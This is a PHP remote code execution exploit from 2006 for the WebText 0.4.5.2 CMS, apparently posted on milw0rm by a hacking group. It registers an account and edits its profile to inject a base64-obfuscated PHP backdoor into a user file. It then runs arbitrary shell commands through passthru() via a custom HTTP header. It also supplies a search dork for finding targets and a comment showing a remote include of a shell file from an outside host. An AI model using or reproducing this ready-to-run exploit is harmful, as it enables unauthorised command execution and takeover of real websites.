<?

//Kacper Settings 
$exploit_name = "WebText <= 0.4.5.2 Remote Code Execution Exploit";
$script_name = "WebText 0.4.5.2";
$script_site = "http://www.webtext.pl/?go=download";
$dork = '"Powered by WebText"';
//**************************************************************


print '
:::::::::  :::::::::: :::     ::: ::::::::::: :::        
:+:    :+: :+:        :+:     :+:     :+:     :+:        
+:+    +:+ +:+        +:+     +:+     +:+     +:+        
+#+    +:+ +#++:++#   +#+     +:+     +#+     +#+        
+#+    +#+ +#+         +#+   +#+      +#+     +#+        
#+#    #+# #+#          #+#+#+#       #+#     #+#        
#########  ##########     ###     ########### ########## 
::::::::::: ::::::::::     :::     ::::    ::::  
    :+:     :+:          :+: :+:   +:+:+: :+:+:+ 
    +:+     +:+         +:+   +:+  +:+ +:+:+ +:+ 
    +#+     +#++:++#   +#++:++#++: +#+  +:+  +#+ 
    +#+     +#+        +#+     +#+ +#+       +#+ 
    #+#     #+#        #+#     #+# #+#       #+# 
    ###     ########## ###     ### ###       ### 
	
   - - [DEVIL TEAM THE BEST POLISH TEAM] - -
 

[Exploit name: '.$exploit_name.'
[Script name: '.$script_name.'
[Script site: '.$script_site.'
dork: '.$dork.'

Find by: Kacper (a.k.a Rahim)


========>  DEVIL TEAM IRC: irc.milw0rm.com:6667 #devilteam  <========
========>         http://www.rahim.webd.pl/            <========

Contact: kacper1964@yahoo.pl

(c)od3d by Kacper
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Greetings DragonHeart and all DEVIL TEAM Patriots :)
- Leito & Leon | friend str0ke ;)

Blund Coder, D0han, d3m0n, D3m0n (ziom z Niemiec :P), dn0de, DUREK5, fdj, Grzegorz, GrZyB997, konsol, Mandr4ke,
mass, michalind, mIvus, Nua, nukedclx, pepi, QunZ, Qw3rty, RebeL, SkD, Adam, arkadius, asteroid, blue, Ci2u, CrazzyIwan,
DMX, drzewko, ExTrEmE][-][ack, Gelo, Kicaj, Larry, Leito, LEON, Michas, Morpheus, MXZ, Ramzes, redsaq, TomZen

 and
 
Dr Max Virus
TamTurk,
hackersecurity.org

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
                Greetings for 4ll Fusi0n Group members ;-)
                and all members of hacker.com.pl ;)
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
';


if ($argc<4) {
print_r('
-----------------------------------------------------------------------------
Usage: php '.$argv[0].' host path cmd OPTIONS
host:       target server (ip/hostname)
path:       WebText path
cmd:        a shell command (ls -la)
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
Example:
php '.$argv[0].' 127.0.0.1 /WebText/ ls -la
php '.$argv[0].' 127.0.0.1 /WebText/ ls -la -P1.1.1.1:80
-----------------------------------------------------------------------------
');

die;
}
/*
You profil is saved in: wt/users/{nick}.php
{nick}.php:
<?php 
$poziom="1"; 
$pass="37fdd249c9e42fc94f45f2s300afe233"; 
$imie="My Name";    //<-----------{1}
$email="kacper1964@yahoo.pl"; 
?>


you can edit Name :) in profil

";?><?include('http://www.site.com/shell.txt');?><?php echo "Kacper :)

expl:

<?php 
$poziom="1"; 
$pass="37fdd249c9e42fc94f45f2s300afe233"; 
$imie="";?><?include('http://www.site.com/shell.txt');?><?php echo "Kacper :)";        //<-----------{2}
$email="kacper1964@yahoo.pl"; 
?>

greetz :)
*/
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacket($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}
function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$host=$argv[1];
$path=$argv[2];
$cmd="";

$port=80;
$proxy="";
for ($i=3; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

$hauru = base64_decode("Ijs/Pjw/cGhwIG9iX2NsZWFuKCk7Ly9SdWNob215IHphbWVrIEhhdXJ1IDs".
"tKWVjaG8iLi4uSGFja2VyLi5LYWNwZXIuLk1hZGUuLmluLi5Qb2xhbmQhIS".
"4uLkRFVklMLlRFQU0uLnRoZS4uYmVzdC4ucG9saXNoLi50ZWFtLi5HcmVld".
"HouLi4iO2VjaG8iLi4uR28gVG8gREVWSUwgVEVBTSBJUkM6IGlyYy5taWx3".
"MHJtLmNvbTo2NjY3ICNkZXZpbHRlYW0iO2VjaG8iLi4uREVWSUwgVEVBTSB".
"TSVRFOiBodHRwOi8vd3d3LnJhaGltLndlYmQucGwvIjtpbmlfc2V0KCJtYX".
"hfZXhlY3V0aW9uX3RpbWUiLDApO2VjaG8gIkhhdXJ1IjtwYXNzdGhydSgkX".
"1NFUlZFUltIVFRQX0hBVVJVXSk7ZGllOz8+PD9waHAgZWNobyBLYWNwZXIg".
"SGFjayA6UCINCg0KDQo=");


$data.='-----------------------------7d6224c08dc
Content-Disposition: form-data; name="login"

Hauru
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="mail"

devilteam@poland.pl
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="mail2"

devilteam@poland.pl
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="im"

'.$hauru.'
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="submit"

rejestruj .
-----------------------------7d6224c08dc--
';


echo "login...\n";
$packet ="POST ".$p."?sekcja=register HTTP/1.0\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6224c08dc\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacket($packet);
sleep(1);

$data.='-----------------------------7d6224c08dc
Content-Disposition: form-data; name="im"

'.$hauru.'
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="mail"

devilteam@poland.pl
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="submit"

zapisz .
-----------------------------7d6224c08dc--
';


echo "edit profile...\n";
$packet ="POST ".$p."?sekcja=edycja HTTP/1.0\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6224c08dc\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacket($packet);
sleep(1);


echo "Hauru!! now remote code execution...\n";
$packet ="GET ".$p."wt/users/Hauru.php HTTP/1.1\r\n";
$packet.="HAURU: ".$cmd."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacket($packet);
if (strstr($html,"Hauru"))
{
$temp=explode("Hauru",$html);
die($temp[1]);
}

echo "Exploit err0r :(\n";
echo "Check register_globals = On and magic_quotes_gpc = off\n";
echo "Go to DEVIL TEAM IRC: irc.milw0rm.com:6667 #devilteam\r\n";
?>

# milw0rm.com [2006-12-28]